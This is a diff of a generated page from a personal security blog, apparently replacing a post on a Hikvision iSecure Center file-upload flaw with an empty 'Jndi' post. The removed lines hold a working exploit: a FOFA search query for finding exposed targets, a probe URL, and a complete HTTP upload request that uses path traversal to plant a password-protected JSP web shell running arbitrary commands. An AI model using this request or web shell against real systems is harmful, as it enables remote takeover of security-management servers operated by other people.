@@ -9,8 +9,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>Hikvision综合安防管理平台文件上传 - Yueyejian’s Blog</title>
-<meta name="description" content="想要成为红队大佬，复现漏洞少不了">
+<!-- begin _includes/seo.html --><title>Jndi - Yueyejian’s Blog</title>
+<meta name="description" content="">
 
 
   <meta name="author" content="yueyejian">
@@ -22,26 +22,26 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Yueyejian's Blog">
-<meta property="og:title" content="Hikvision综合安防管理平台文件上传">
-<meta property="og:url" content="http://localhost:4000/vul/hikvision/">
+<meta property="og:title" content="Jndi">
+<meta property="og:url" content="http://localhost:4000/JNDI/">
 
 
-  <meta property="og:description" content="想要成为红队大佬，复现漏洞少不了">
-
-
-
-
-
-
-
-  <meta property="article:published_time" content="2023-11-22T00:00:00+08:00">
+  <meta property="og:description" content="">
 
 
 
 
 
 
-<link rel="canonical" href="http://localhost:4000/vul/hikvision/">
+
+  <meta property="article:published_time" content="2024-04-08T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/JNDI/">
 
 
 
@@ -255,15 +255,15 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="Hikvision综合安防管理平台文件上传">
-    <meta itemprop="description" content="想要成为红队大佬，复现漏洞少不了">
-    <meta itemprop="datePublished" content="2023-11-22T00:00:00+08:00">
+    <meta itemprop="headline" content="Jndi">
+    <meta itemprop="description" content="">
+    <meta itemprop="datePublished" content="2024-04-08T00:00:00+08:00">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">Hikvision综合安防管理平台文件上传
+          <h1 id="page-title" class="page__title" itemprop="headline">Jndi
 </h1>
           
 
@@ -273,7 +273,7 @@
       <span class="page__meta-date">
         <i class="far fa-calendar-alt" aria-hidden="true"></i>
         
-        <time datetime="2023-11-22T00:00:00+08:00">November 22, 2023</time>
+        <time datetime="2024-04-08T00:00:00+08:00">April 8, 2024</time>
       </span>
     
 
@@ -298,40 +298,15 @@
 
       <section class="page__content" itemprop="text">
         
-        <p>想要成为红队大佬，复现漏洞少不了</p>
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              
 
-<p><img src="/images/vul/hikvision/1.png" alt="" /></p>
-
-<p>fofa查询语句：<code class="language-plaintext highlighter-rouge">icon_hash="-808437027" &amp;&amp; app="HIKVISION-iSecure-Center"</code></p>
-
-<p>如果凭拼接<code class="language-plaintext highlighter-rouge">/center/api/files;.js</code>后如下图响应，则漏洞很大可能存在</p>
-
-<p><img src="/images/vul/hikvision/2.png" alt="" /></p>
-
-<p>上传木马</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /center/api/files;.js HTTP/1.1
-Host: xxx.xxx.xxx.xxx
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: close
-Content-Length: 539
-Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4
-
---e54e7e5834c8c50e92189959fe7227a4
-Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp"
-Content-Type: application/octet-stream
-
-&lt;% if("yueyejian".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("&lt;pre&gt;"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("&lt;/pre&gt;"); } %&gt;
---e54e7e5834c8c50e92189959fe7227a4--
-</code></pre></div></div>
-
-<p><img src="/images/vul/hikvision/3.png" alt="" /></p>
-
-<p>拼接<code class="language-plaintext highlighter-rouge">/clusterMgr/[文件名];.js</code>可访问</p>
-
-<p><img src="/images/vul/hikvision/4.png" alt="" /></p>
-
+            </nav>
+          </aside>
+        
+        
 
         
       </section>
@@ -339,45 +314,11 @@ Content-Type: application/octet-stream
       <footer class="page__meta">
         
         
-  
-
-
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
-    <span itemprop="keywords">
-    
-      <a href="/tags/#hikvision" class="page__taxonomy-item" rel="tag">hikvision</a><span class="sep">, </span>
-    
-      <a href="/tags/#nday" class="page__taxonomy-item" rel="tag">nday</a><span class="sep">, </span>
-    
-      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
-    
-    </span>
-  </p>
-
-
-
-
-  
-
-
-  
-
-  <p class="page__taxonomy">
-    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
-    <span itemprop="keywords">
-    
-      <a href="/categories/#vul" class="page__taxonomy-item" rel="tag">vul</a>
-    
-    </span>
-  </p>
 
 
         
 
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-22T00:00:00+08:00">November 22, 2023</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-04-08T00:00:00+08:00">April 8, 2024</time></p>
 
 
       </footer>
@@ -387,12 +328,11 @@ Content-Type: application/octet-stream
       
   <nav class="pagination">
     
-      <a href="/vul/nacos/" class="pagination--pager" title="CVE-2021-29441 - Nacos身份认证绕过漏洞
+      <a href="/vul/hikvision/" class="pagination--pager" title="Hikvision综合安防管理平台文件上传
 ">Previous</a>
     
     
-      <a href="/JNDI/" class="pagination--pager" title="Jndi
-">Next</a>
+      <a href="#" class="pagination--pager disabled">Next</a>
     
   </nav>
 
